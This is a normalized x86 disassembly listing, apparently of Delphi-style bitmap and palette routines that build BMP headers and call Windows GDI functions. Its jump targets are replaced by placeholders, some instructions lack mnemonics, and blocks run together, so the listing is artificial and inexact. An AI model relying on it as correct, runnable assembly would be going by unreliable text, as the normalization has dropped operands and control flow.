mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_4273bc
sub_427778
push ebx
mov ebx eax
mov eax ebx
call sub_4278e0
mov eax ebx
call sub_4278f0
mov edx ebx
mov eax ebx
call sub_4273bc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_42779c
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_42781c
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_423584
mov eax ebx
call sub_4277ec
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_427730
xor edx edx
pop ecx
call sub_4249fc
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_42786c
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_4279f0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_426894
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_4278f0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41aae4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_427973
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_427990
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_4278e0
mov eax ebx
call sub_4278f0
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_42781c
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_426f5c
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_426450
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4279f0
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_42554c
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_426450
push 0x0
call GetDC
call sub_424e5c
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_427aa8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424d30
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4272fc
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_4278e0
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_427b2c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41aac4
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_4281e0
pop esi
pop ebx
retn
sub_427b50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427bd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403324
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_427c37
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_4266c4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_4266c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427c3e
push rw-data
call LeaveCriticalSection
retn
sub_427c50
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_4281e0
pop edx
pop edi
pop esi
pop ebx
retn
sub_427c78
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026f4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_428195
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_428168
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b80
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424d48
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41ad60
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402b80
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41acf0
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_424fcc
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424fec
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41acf0
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_424e5c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4280e3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425294
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026f4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42804b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41acf0
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424e5c
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42801f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_42554c
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40ca90
call sub_424d48
jmp r-xdata
xor eax eax
push ebp
push sub_4280b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41acf0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428026
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4280ea
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40ca90
call sub_424d48
jmp r-xdata
sub_428026
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402714
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_4280ea
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42817f
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_42554c
mov [ ebp - 0x30 ] eax
sub_42819c
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_427b50
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4281e0
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4278e0
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41acf0
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b80
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_427b50
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_427c78
call sub_424d48
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_428250
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_4278e0
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b80
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_426ef8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4282eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_427b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428314
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_42779c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4278e0
mov eax esi
call sub_4279f0
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_4278e0
mov eax esi
call sub_4279f0
mov eax esi
call sub_42786c
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_426ef8
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4272fc
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_427b50
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_427b50
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_426894
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42844c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4278f0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4272fc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4284a0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4278f0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4272fc
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428520
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4278e0
mov eax ebx
call sub_4278f0
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_426894
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4285b7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_427b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_42678c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_422cb4
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_4285bc
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403950
call sub_4039a4
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_42678c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4285f4
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4278f0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4272fc
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428650
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b80
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_42786c
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_425c88
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41ad28
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41ad28
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b80
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_427730
mov dl [ r-xdata ]
call sub_424b44
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424e5c
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
